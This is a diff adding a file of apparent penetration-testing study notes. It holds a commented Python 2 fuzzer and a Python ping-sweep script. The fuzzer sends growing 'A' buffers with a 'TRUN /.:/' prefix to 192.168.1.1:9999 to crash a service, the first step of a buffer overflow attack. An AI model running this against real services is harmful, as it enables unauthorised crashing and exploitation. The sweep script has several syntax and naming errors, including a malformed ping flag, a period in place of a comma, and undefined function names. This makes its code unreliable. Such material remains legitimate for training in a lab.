@@ -1,0 +1,91 @@
+#buffer overflow script
+#fuzzing script written in python2 but concept is still the same
+#declare that you are suing python
+#import modules to do things for you sys and socket
+#socket to allow us to do things with ipv4
+#we have a variable buffer that equals to a string of 100 As. sting of A multiplied by 100
+#have a while loop that says as long as the loop is true, it will run
+#we will "try" to do execute something and if something else happens(except)
+#close the program
+#send a connection through the first line, to an ip in the port in the second line
+#send a message with variable buffer
+#close out the connection
+#sleep for a second
+#append buffer for a second 100 As. becomes 200 As and try it again.
+#if we break the program, print out where buffer is and exit.
+
+#!usr/bin/python
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+        try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.1.1',9999))
+                s.send(('TRUN /.:/' + buffer))
+                s.close()
+                sleep(1)
+                buffer = buffer + "A"*100
+
+        except:
+                print "Fuzzing crashed at %s bytes" % (str(len(buffer))) #confirm if there needs to be 3 closing parenthesis
+                sys.exit()
+ 
+
+#another sweeping script
+#import some modules that are needed subprocess for files, datetime, re and argparse for arguments; if you have a switch
+#define some functions: write_result, ping_subnet, main(common function), parse_arguments and if__name__ == '__main__'(common)
+#first function defines a write_result with filename and ping. it writes a start time and datetime in a file.
+#for any result in ping, it will write to result file and then write end time.
+#second function ping_subnet for address in range 1 through 255 to yield Popen(poping- to start a process)
+#ping the subnet and addressed and give it a number of 1
+#then we have the main function
+#then the parse function(this is where the argparse comes into play); it gives the usage, the description for ip checker, the epilog; 
+#how to run the syntax; python ipscanner for an ip range and save it in a file
+#parser add argument. with a subnet argument
+#if you don't have match a subnet argument in the range 1 through 255, it is not valid
+#if statement for no whitespaces
+#then return arguments for subnet and filename.
+import subprocess
+import datetime
+import re
+
+import argparse
+def write_result(filename, ping):
+    with open(filename, "w") as f:
+        f.write(f"Start time {datetime.datetime.now()}")
+        for result in ping:
+            f.write(result)
+        f.write(f"End time {datetime.datetime.now()}")
+
+def ping_subnet(subnet):
+    for addr in range(1, 255):
+        yield subprocess.Popen(["ping", f"{subnet}.{addr}", ".n" "1"]. stdout=subprocess.PIPE) \
+                        .stdout.read()                                                         \
+                        .decode()
+def main(subnet, filename):
+    write_result(filename, ping_subnet(subnet))
+
+def parse_argument():
+    parser = argparse.ArgumentParser(usage='%(prog)s [options] <subnet>',
+                                     description='ip checker',
+                                     epilog="python ipscanner.py 192.168.1 -f somefile.txt")
+    parser.add_argument('subnet', type=str, help='the subnet you want to ping')
+    parser.add_argument('-f', '--filename', type=str, help='The filename')
+    args = parser.parse_args()
+
+    if not re.match(r"(\d{1,3}\.\d{1,3}\.\d{1,3})", args.subnet) \
+    or any(a not in range(1, 255) for a in map(int, args.subnet.split("."))):
+    parse.error("This is not a valid subnet")
+
+    if " " in args.filename:
+        parser.error("There cannot be whitespaces in the filename")
+
+    return args.subnet, args.filename
+
+if __name__ == '__main__':
+    main(*parse_arguments())
+
+
